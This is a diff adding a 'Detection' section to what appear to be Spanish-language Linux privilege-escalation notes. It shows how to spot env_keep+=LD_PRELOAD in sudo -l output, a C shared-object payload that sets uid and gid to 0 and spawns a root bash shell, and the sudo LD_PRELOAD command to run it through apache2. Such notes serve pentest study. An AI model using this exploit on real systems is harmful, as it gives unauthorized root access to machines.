@@ -359,4 +359,39 @@ https://gcc.gnu.org/onlinedocs/gcc-8.5.0/gcc/Link-Options.html
 
 https://medium.com/swlh/linux-basics-static-libraries-vs-dynamic-libraries-a7bcf8157779
 
+### Detection
+
+Para detectar si podemos escalar privilegios en una maquina primero usamos sudo -l:
+
+
+```
+user@debian:~$ sudo -l 
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD
+```
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD"); // esto se usa porque cuando se explota se usa esta misma entonces entra en un bucle infinito ver abajo y paginas
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+Eplotando 
+
+```
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+
+```
+
+here <COMMAND> mean which command have u allowed to do with sudo.
+
+
+
+
 
